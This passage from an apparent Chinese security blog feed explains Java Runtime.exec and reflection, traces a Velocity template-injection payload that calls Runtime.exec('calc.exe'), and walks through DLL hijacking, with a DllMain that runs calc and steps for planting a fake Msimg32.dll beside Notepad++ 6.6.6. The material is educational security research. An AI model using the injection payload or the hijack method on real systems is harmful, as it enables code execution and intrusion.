System.out.println(res);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><ol><li>Windows下调用系统命令并弹出命令行窗口</li></ol><blockquote><p>String [] cmd={“cmd”,”/C”,”start copy exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd[]=&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;start&quot;</span>,<span class="string">&quot;dir&quot;</span>&#125;;</span><br><span class="line">Process proc2=Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220307222310392.png" alt="image-20220307222310392"></p></blockquote><h2 id="Linux下执行命令的几种方式"><a href="#Linux下执行命令的几种方式" class="headerlink" title="Linux下执行命令的几种方式"></a>Linux下执行命令的几种方式</h2><ol><li>Linux下调用程序</li></ol><blockquote><p>Process proc =Runtime.getRuntime().exec(“./exefile”);</p></blockquote><ol><li>Linux下调用系统命令</li></ol><blockquote><p>String [] cmd={“/bin/sh”,”-c”,”ln -s exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote><ol><li>Linux下调用系统命令并弹出命令行窗口</li></ol><blockquote><p>String [] cmd={“/bin/sh”,”-c”,”xterm -e ln -s exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote><h1 id="Java反射相关知识"><a href="#Java反射相关知识" class="headerlink" title="Java反射相关知识"></a>Java反射相关知识</h1><p>先说一个不成熟的结论，个人对Java反射的理解类似python jinja2模板渲染引擎SSTI漏洞中找RCE利用链一样：从当前类找到object类（forName/__base__），在从object类的子类中找到存在命令执行方法的子类(runtime.getruntime()/subclasses())，最后找到命令执行方法(exec/popen)</p><p>Java反射是在运行状态中对于任意一个类都可以找到这个类的类名，构造方法，成员方法，属性。这种动态获取对象属性的机制称为Java的反射机制。</p><h2 id="反射的优点与缺点"><a href="#反射的优点与缺点" class="headerlink" title="反射的优点与缺点"></a>反射的优点与缺点</h2><p><strong>优点：</strong><br>反射机制可以实现动态创建对象和编译，体现出很大的灵活性，特别是在J2EE的开发者他的灵活性就表现得十分明显。例如，在一个大型软件的开发中，当程序被编译后发布，如果以后需要更新某些功能的时候，我们不可能要用户把以前软件的卸载，再重新安装新的版本。采用静态的话，需要把整个程序重新编译一次才可以实现功能的更新，而采用反射机制的话，它就可以不用卸载，只需要在运行时才动态的创建和编译，就可以实现该功能。</p><p><strong>缺点：</strong><br>对性能有影响。反射机制其实是一种解释操作，我们通过告诉JVM，我们希望做什么并且他们组我们的要求。这类操作总是慢于只直接执行相同的操作</p><h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><p>Class类是所有类的类，对于普通的对象，新建一个对象的实例如下：</p><p>Demo demo = new Demo();</p><p>但是不能直接用Class cls=new Class();去创建一个class类，因为Class类的构造方法是私有的，不允许被外部调用构建。</p><p>然而我们可以通过其他方法获取到class类：</p><ol><li><p>```java<br>Demo demo=new Demo(); Class cls=demo.getclass();</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. &#96;&#96;&#96;java</span><br><span class="line">   Class cls2&#x3D;Demo.class;</span><br></pre></td></tr></table></figure></li><li><p>```java<br>Class cls3=Class.forName(“com.org.ReflectDemo.Demo”)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">获取到Class对象之后，可以通过反射机制获取到对象的信息。</span><br><span class="line"></span><br><span class="line">## Java反射相关方法</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;java</span><br><span class="line">public Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)  &#x2F;&#x2F;获得该类所有的方法，不包括父类</span><br><span class="line">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)&#x2F;&#x2F;获得该类所有public的方法，包括父类。第一二个参数可以指定特定的方法，比如exec(String)和exec(String[])，通过第一个参数指定exec，第二个参数指定String 或者String[] 可以定位不同的方法。</span><br><span class="line">public Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)&#x2F;&#x2F;获得该类所有的构造方法</span><br><span class="line">public Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes)&#x2F;&#x2F;获得该类所有的public构造方法 包括父类</span><br><span class="line">public Field getDeclaredField(String name)&#x2F;&#x2F;获得该类所有的声明变量，不包括父类</span><br><span class="line">public Field getField(String name)&#x2F;&#x2F;获得该类所有的public声明变量，包括父类</span><br><span class="line">writeObject（）&#x2F;&#x2F;序列化，将Object输出成Byte流</span><br><span class="line">readObject（）&#x2F;&#x2F;反序列化，将Byte流输出成Object</span><br><span class="line">invoke()</span><br></pre></td></tr></table></figure></li></ol><p>invoke()的作用是执行(call)方法，正常的方法调用顺序为 <strong>object.method(p1,p2,p3)</strong></p><p>使用invoke的调用顺序为<strong>method.invoke(object,p1,p2,p3)</strong></p><p>getMethod方法重载：通过指定方法名和方法参数类型确定唯一一个方法。<img src="http://cdn.polowong.top/image-20220307234218733.png" alt="image-20220307234218733"></p><h2 id="java-单例模式"><a href="#java-单例模式" class="headerlink" title="java 单例模式"></a>java 单例模式</h2><p>Runtime的构造器是私有的，所以不可以直接new一个Runtime的对象。</p><p>这里搬运下runoob的介绍：</p><p>单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。</p><p>这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。</p><p><strong>注意：</strong></p><ul><li>1、单例类只能有一个实例。</li><li>2、单例类必须自己创建自己的唯一实例。</li><li>3、单例类必须给所有其他对象提供这一实例。</li></ul><p>个人理解单例模式就是一个类只有一个实例化对象在类内部，需要的时候就调用，全局仅维护这一个实例化对象，调用的时候没有就创建，有就返回实例化对象。这个实例化对象有的话只能有一个。</p><p>示例一：</p><p>Runtime的构造器属性为私有是有原因的，这是一种”单例模式”，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连<br>接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来获取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainDB</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> TrainDB instance = <span class="keyword">new</span> TrainDB();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">TrainDB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    db.conn();</span><br><span class="line"><span class="comment">// 建立连接的代码...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例二：</p><p>创建一个 Singleton 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleObject</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//创建 SingleObject 的一个对象</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> SingleObject instance = <span class="keyword">new</span> SingleObject();</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//让构造函数为 private，这样该类就不会被实例化</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="title">SingleObject</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//获取唯一可用的对象</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingleObject <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> instance;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从 singleton 类获取唯一的对象。\</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonPatternDemo</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//不合法的构造函数</span></span><br><span class="line">      <span class="comment">//编译时错误：构造函数 SingleObject() 是不可见的</span></span><br><span class="line">      <span class="comment">//SingleObject object = new SingleObject();</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取唯一可用的对象</span></span><br><span class="line">      SingleObject object = SingleObject.getInstance();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//显示消息</span></span><br><span class="line">      object.showMessage();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="java反射demo"><a href="#java反射demo" class="headerlink" title="java反射demo"></a>java反射demo</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//reflection demo 1</span></span><br><span class="line">        Class c2=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Object o1=c2.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        c2.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(o1,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>如果一个类的构造方法为私有，可以执行，不过需要一些操作：使用getDeclearedConstructor获取所有构造方法，设置可访问标记为true即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//reflection demo 2</span></span><br><span class="line">        Class c1=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Constructor cs=c1.getDeclaredConstructor();</span><br><span class="line">        cs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        c1.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(cs.newInstance(),<span class="string">&quot;notepad&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="java反射rce-SSTI"><a href="#java反射rce-SSTI" class="headerlink" title="java反射rce-SSTI"></a>java反射rce-SSTI</h1><p>velocity ssti，参考链接<a href="https://samny.blog.csdn.net/article/details/104881477">https://samny.blog.csdn.net/article/details/104881477</a></p><p>具体模板语言不讲了，根据payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?template&#x3D;%23set($e&#x3D;&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;)</span><br></pre></td></tr></table></figure><p>直接debug</p><p><img src="http://cdn.polowong.top/image-20220307235823301.png" alt="image-20220307235823301"></p><p><img src="http://cdn.polowong.top/image-20220307235841610.png" alt="image-20220307235841610"></p><p>一步步跟踪，跟踪到<strong>evaluate</strong>方法发现将<strong>String</strong>类型的输入转为了<strong>Reader</strong>类型：<strong>Reader</strong>是一个抽象类，它是以字符为单位的输入流的公共父类。<img src="http://cdn.polowong.top/image-20220307235925388.png"></p><p>继续跟踪到<strong>parse</strong>方法</p><p><img src="http://cdn.polowong.top/image-20220308000025688.png" alt="image-20220308000025688"></p><p>继续跟<strong>parse</strong>方法</p><p><img src="http://cdn.polowong.top/image-20220308000210699.png" alt="image-20220308000210699"></p><p><img src="http://cdn.polowong.top/image-20220308000719740.png" alt="image-20220308000719740"></p><p>进入<strong>init</strong>方法后 继续跟，跟到<strong>render</strong>方法</p><p><img src="http://cdn.polowong.top/image-20220308001022402.png" alt="image-20220308001022402"></p><p><img src="http://cdn.polowong.top/image-20220308001238023.png" alt="image-20220308001238023"></p><p><img src="http://cdn.polowong.top/image-20220308001303577.png" alt="image-20220308001303577"></p><p>继续跟进去看<strong>render</strong>方法</p><p>跟到后面发现<strong>execute</strong>方法，像invoke的调用方法，继续跟进去看看</p><p><img src="http://cdn.polowong.top/image-20220308001522947.png" alt="image-20220308001522947"></p><p>又是一个<strong>execute</strong>方法，继续跟</p><p><img src="http://cdn.polowong.top/image-20220308001654919.png" alt="image-20220308001654919"></p><p>哈哈，终于找到了眼熟的<strong>getMethod</strong>和<strong>invoke</strong>方法</p><p><img src="http://cdn.polowong.top/image-20220308001749767.png" alt="image-20220308001749767"></p><p>这样循环走下去，接下来是runtime，Runtime.getruntime()，exec(“calc”)。</p><p><img src="http://cdn.polowong.top/image-20220308001902056.png" alt="image-20220308001902056"></p><p><img src="http://cdn.polowong.top/image-20220308001936027.png" alt="image-20220308001936027"></p><p>最终弹出来了计算器</p><p><img src="http://cdn.polowong.top/image-20220308002715772.png" alt="image-20220308002715772"><br>#参考链接</p><p><a href="https://samny.blog.csdn.net/article/details/104881477">https://samny.blog.csdn.net/article/details/104881477</a><br><a href="https://www.sec-in.com/article/307">https://www.sec-in.com/article/307</a><br><a href="https://le1a.gitee.io/posts/916c2e64/">https://le1a.gitee.io/posts/916c2e64/</a><br><a href="https://blog.csdn.net/m0_38103658/article/details/105482035">https://blog.csdn.net/m0_38103658/article/details/105482035</a><br><a href="https://cloud.tencent.com/developer/article/1607776">https://cloud.tencent.com/developer/article/1607776</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java执行系统命令&quot;&gt;&lt;a href=&quot;#Java执行系统命令&quot; class=&quot;headerlink&quot; title=&quot;Java执行系统命令&quot;&gt;&lt;/a&gt;Java执行系统命令&lt;/h1&gt;&lt;h2 id=&quot;cmd相关参数&quot;&gt;&lt;a href=&quot;#cmd相关参数&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DLL劫持基础及红队武器化</title>
    <link href="https://polosec.github.io/2022/03/01/DLL%E5%8A%AB%E6%8C%81%E5%9F%BA%E7%A1%80%E5%8F%8A%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%8C%96/"/>
    <id>https://polosec.github.io/2022/03/01/DLL%E5%8A%AB%E6%8C%81%E5%9F%BA%E7%A1%80%E5%8F%8A%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%8C%96/</id>
    <published>2022-03-01T14:36:40.000Z</published>
    <updated>2022-03-01T14:36:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是DLL"><a href="#什么是DLL" class="headerlink" title="什么是DLL"></a>什么是DLL</h1><blockquote><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。</p></blockquote><blockquote><p>DLL 是一个包含可由多个程序同时使用的代码和数据的库。例如，在 Windows 操作系统中，Comdlg32 DLL 执行与对话框有关的常见函数。因此，每个程序都可以使用该 DLL 中包含的功能来实现“打开”对话框。这有助于促进代码重用和内存的有效使用。</p></blockquote><h2 id="DLL加载顺序"><a href="#DLL加载顺序" class="headerlink" title="DLL加载顺序"></a>DLL加载顺序</h2><p>一、Windows XP SP2之前 Windows查找DLL的目录以及对应的顺序：</p><ol><li>进程对应的应用程序所在目录；</li><li>当前目录（Current Directory）；</li><li>系统目录（通过 GetSystemDirectory 获取）；</li><li>16位系统目录；</li><li>Windows目录（通过 GetWindowsDirectory 获取）；</li><li>PATH环境变量中的各个目录；</li></ol><p>例如：对于文件系统,如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。</p><p>二、在Windows xp sp2之后</p><p>Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：</p><p>默认注册表为：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode，其键值为1</p><ol><li>进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</li><li>系统目录（即%windir%system32）；</li><li>16位系统目录（即%windir%system）；</li><li>Windows目录（即%windir%）；</li><li>当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</li><li>PATH环境变量中的各个目录；</li></ol><p>三、Windows7以上</p><p>系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：</p><p>计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</p><p><img src="http://cdn.polowong.top/image-20220228164016478.png" alt="image-20220228164016478"></p><p>那么最终Windows2003以上以及win7以上操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p><ol><li><p>进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</p></li><li><p>系统目录（即%windir%system32）；</p></li><li><p>16位系统目录（即%windir%system）；</p></li><li><p>Windows目录（即%windir%）；</p></li><li><p>当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</p></li><li><p>PATH环境变量中的各个目录</p><p><img src="http://cdn.polowong.top/image-20220228164254582.png" alt="image-20220228164254582"></p></li></ol><h2 id="DLL正常调用demo"><a href="#DLL正常调用demo" class="headerlink" title="DLL正常调用demo"></a>DLL正常调用demo</h2><h3 id="DLLdemo"><a href="#DLLdemo" class="headerlink" title="DLLdemo"></a>DLLdemo</h3><p>vs2019新建动态链接库模板项目</p><p>项目结构如下</p><p><img src="http://cdn.polowong.top/image-20220228164734371.png" alt="image-20220228164734371"></p><p>在dllmain.cpp中添加如下代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该dll的作用是在进程调用该dll时执行计算器</p><p>添加头文件test.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">msg</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><p>__declspec(dllexport)用于Windows中的动态库中，声明导出函数msg供其它程序调用</p></blockquote><p>添加cpp文件实现msg方法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;test.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">msg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;This is msg function:-)&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用demo"><a href="#调用demo" class="headerlink" title="调用demo"></a>调用demo</h3><p>新建一个控制台项目</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="comment">//定义函数类DLLFUNC</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*DLLFUNC)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">    DLLFUNC GetDllfunc = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//指定需要加载的dll文件</span></span><br><span class="line">    HINSTANCE hinst = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;hijack.dll&quot;</span>);<span class="comment">//加载dll文件</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hinst != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//获取函数的位置</span></span><br><span class="line">        GetDllfunc = (DLLFUNC)<span class="built_in">GetProcAddress</span>(hinst, <span class="string">&quot;msg&quot;</span>);<span class="comment">//获取dll中的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (GetDllfunc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//运行msg函数</span></span><br><span class="line">        (*GetDllfunc)();<span class="comment">//调用dll中的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;Error!&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;end&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将consoleapplication 与dll文件放在同一目录，运行exe</p><p><img src="http://cdn.polowong.top/image-20220228165110704.png" alt="image-20220228165110704"></p><p>可以看到，根据代码逻辑调用了dll文件，弹出了计算器并且成功调用了msg方法</p><p><img src="http://cdn.polowong.top/image-20220228165149367.png" alt="image-20220228165149367"></p><h1 id="什么是DLL劫持"><a href="#什么是DLL劫持" class="headerlink" title="什么是DLL劫持"></a>什么是DLL劫持</h1><p>由上述的DLL加载顺序得知，如果某个程序需要的dll文件在程序根目录不存在，会继续向后寻找dll文件，那么我们手动编写一个dll文件至程序根目录并且将dll名称改为程序需要的那个缺少的dll文件，根据加载顺序会优先加载我们编写的dll文件，实现dll劫持的效果。dll劫持的目的是替换/劫持/新增 恶意dll文件实现代码执行。</p><p>由此可以引出几种dll劫持的形式：</p><ol><li>直接将恶意dll暴力替换掉正常dll，软件正常功能会受影响</li><li>将恶意dll作为中间人，转发调用正常dll的导出函数，同时加入额外的恶意操作</li><li>利用加载顺序的机制，让恶意dll先于正常dll加载</li><li>利用软件本身缺失的dll加载恶意dll</li><li>更改环境变量或是.exe.manifest/.exe.local文件实现dll重定向</li><li>如果利用低权限劫持的dll文件，会被高权限程序加载运行，就是一个权限提升漏洞</li></ol><h1 id="DLL劫持实例"><a href="#DLL劫持实例" class="headerlink" title="DLL劫持实例"></a>DLL劫持实例</h1><h2 id="劫持Notepad-不存在的DLL"><a href="#劫持Notepad-不存在的DLL" class="headerlink" title="劫持Notepad++不存在的DLL"></a>劫持Notepad++不存在的DLL</h2><p>一般可以使用processmonitor、process explorer查找可能存在dll劫持的进程</p><p>使用process monitor查找与notepad++相关的进程，注：notepad++不要用最新版，最新版修复了劫持漏洞，这里用的是6.6.6版本。</p><p>这里打开过后设置几个过滤条件，分别是进程名、路径以及结果</p><p><img src="http://cdn.polowong.top/image-20220228170217568.png" alt="image-20220228170217568"></p><p>然后这里找一个需要用到<code>loadlibrary</code>这个api的dll，这里找有这个api的原因是因为如果该dll的调用栈中存在有 **LoadLibrary(Ex)**，说明这个DLL是被进程所动态加载的。在这种利用场景下，伪造的DLL文件不需要存在任何导出函数即可被成功加载，即使加载后进程内部出错，也是在DLL被成功加载之后的事情。</p><p><img src="http://cdn.polowong.top/image-20220228170242843.png" alt="image-20220228170242843"></p><p>可以看到，Msimg32.dll文件是程序运行需要但是没找到的，所以我们可以写一个Msimg32.dll文件放到程序根目录实现动态恶意dll加载。</p><p>将刚才的dll hijack demo生成的dll文件放到notepad++的根目录并改名为Msimg32.dll，当再次打开notepad++.exe时即可完成劫持</p><p><img src="http://cdn.polowong.top/image-20220228170823499.png" alt="image-20220228170823499"></p><p><img src="http://cdn.polowong.top/image-20220228170839113.png" alt="image-20220228170839113"></p><h2 id="劫持Notepad-中存在的DLL"><a href="#劫持Notepad-中存在的DLL" class="headerlink" title="劫持Notepad++中存在的DLL"></a>劫持Notepad++中存在的DLL</h2><p>将procmon中NOT FOUND 的条件改为SUCCESS</p><p><img src="http://cdn.polowong.top/image-20220228172005462.png" 